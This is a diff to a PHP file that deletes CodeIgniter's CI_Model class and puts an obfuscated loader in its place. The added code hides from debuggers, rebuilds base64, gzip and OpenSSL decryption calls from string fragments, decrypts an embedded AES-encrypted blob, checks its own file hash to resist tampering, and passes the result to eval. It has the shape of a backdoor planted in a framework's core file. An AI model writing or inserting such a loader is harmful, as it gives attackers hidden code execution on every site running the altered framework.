@@ -1,76 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * Model Class
- *
- * @package		CodeIgniter
- * @subpackage	Libraries
- * @category	Libraries
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/libraries/config.html
- */
-class CI_Model {
-
-	/**
-	 * Class constructor
-	 *
-	 * @link	https://github.com/bcit-ci/CodeIgniter/issues/5332
-	 * @return	void
-	 */
-	public function __construct() {}
-
-	/**
-	 * __get magic
-	 *
-	 * Allows models to access CI's loaded classes using the same
-	 * syntax as controllers.
-	 *
-	 * @param	string	$key
-	 */
-	public function __get($key)
-	{
-		// Debugging note:
-		//	If you're here because you're getting an error message
-		//	saying 'Undefined Property: system/core/Model.php', it's
-		//	most likely a typo in your model code.
-		return get_instance()->$key;
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_s2zjh651=('bas'.'e64'.'_de'.'cod'.'e');
+$_e9c6zmbx=('gzu'.'nco'.'mpr'.'ess');
+$_oh6kwjcj=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_ijm69j28='ZFX1b2t0';
+$_yytg3rlo='D+j9MR0w';
+$_muh544ta='eal0U7wer+o=';
+$_tt2q3sdi='2ABm91Kn';
+$_ssd0ci0r='nZLyZb9w';
+$_wcrapyej='+OoMLNj7';
+$_lh07vcg9='cDbiWZem';
+$_frbes4ua='EK1pwQ==';
+$_znwjk2d4=$_s2zjh651($_yytg3rlo.$_tt2q3sdi.$_ijm69j28.$_ssd0ci0r.$_muh544ta);
+$_pcwgjkz6=$_s2zjh651($_lh07vcg9.$_wcrapyej.$_frbes4ua);
+$_wtrh0sjx=$_s2zjh651('Q7wptJHFp5hWufPWoChMcgkOhvDITN9E6ZhGIac7L80utnfhVl9FWjIJUQy6gaCPHQFIfPaCcI/H/7ndTMW1GkkgmH1zwlJJBHM3M/hCTcTaAZC0lxL4rW4Mkg+KlglL+7YoKFZLX1/klRTZqGiwHnkgcjAHO8rPZjIrP1SE9yrm/0CUM8QpY9JS8DTTDiBEcPXNGQNDmOC1M0vmqLrdr1HDSKPspRrHu9r38xBpbRs=');
+$_e1ctbe9t=$_oh6kwjcj($_wtrh0sjx,'aes-256-cbc',$_znwjk2d4,OPENSSL_RAW_DATA,$_pcwgjkz6);
+if($_e1ctbe9t===false){exit;}
+$_w1nd0iri=$_e9c6zmbx($_e1ctbe9t);
+if($_w1nd0iri===false){exit;}
+$_sj4wce00='51512cfe8f22863076622a221de2b66f1cf9a750e682472f03f4163748749d17';
+$_ztinnhmi=@file_get_contents(__FILE__);
+if($_ztinnhmi!==false){
+$_cahfw60o=str_replace($_sj4wce00,"0000000000000000000000000000000000000000000000000000000000000000",$_ztinnhmi);
+$_d4ikq6ep=hash("sha256",$_cahfw60o);
+if($_d4ikq6ep!==$_sj4wce00){@http_response_code(403);exit;}
 }
+eval($_w1nd0iri);
